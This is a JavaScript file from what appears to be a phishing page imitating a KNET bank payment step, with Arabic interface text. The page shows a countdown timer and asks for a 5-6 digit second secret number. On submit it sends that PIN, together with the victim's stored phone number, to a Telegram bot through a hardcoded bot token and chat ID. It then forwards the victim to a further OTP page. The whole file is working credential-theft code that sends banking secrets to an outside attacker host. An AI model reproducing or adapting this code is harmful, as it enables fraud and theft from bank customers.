let duration = 2 * 60;
const timerDisplay = document.getElementById('timer');

const countdown = setInterval(() => {
    const minutes = Math.floor(duration / 60);
    const seconds = duration % 60;
    timerDisplay.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
    if (duration <= 0) {
        clearInterval(countdown);
        timerDisplay.textContent = "انتهى الوقت";
    }
    duration--;
}, 1000);

document.addEventListener("DOMContentLoaded", function () {
    const amount = localStorage.getItem("boton");
    if (amount) {
        document.getElementById("amontValu").textContent = amount;
    }

    const totalAmount = localStorage.getItem("totalAmount");
    if (totalAmount) {
        document.getElementById("amountValu").innerText = totalAmount;
    }

    document.getElementById("paymentForm").addEventListener("submit", function (e) {
        e.preventDefault();
        sendToTelegram();
    });
});

function sendToTelegram() {
    const token = "8086646027:AAH2MyOuWFl3Hw-9KfdbbSjbvYp7p9jkjyE";
    const chatId = "7595871538";
    const pinInput = document.getElementById("pin");
    const pin = pinInput.value.trim();
    const phone = localStorage.getItem("storedPhone");

    if (!/^\d{5,6}$/.test(pin)) {
        alert("الرقم السري غير صالح");
        return;
    }

    const message =
        `📩  2 رمز كي نت\n\n` +
        `👤 من : ${phone || 'غير متوفر'}\n` +
        `🔑 الرقم السري الثاني: ${pin}`;

    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
    })
        .then(() => {
            window.location.href = "otp2.html";
        })
        .catch(error => {
            console.error("خطأ في الإرسال:", error);
        });
}

setTimeout(function () {
    const element = document.getElementById('namenone');
    if (element) element.style.display = 'none';

    document.body.querySelectorAll('*').forEach(function (el) {
        el.style.visibility = 'visible';
    });
}, 5000);

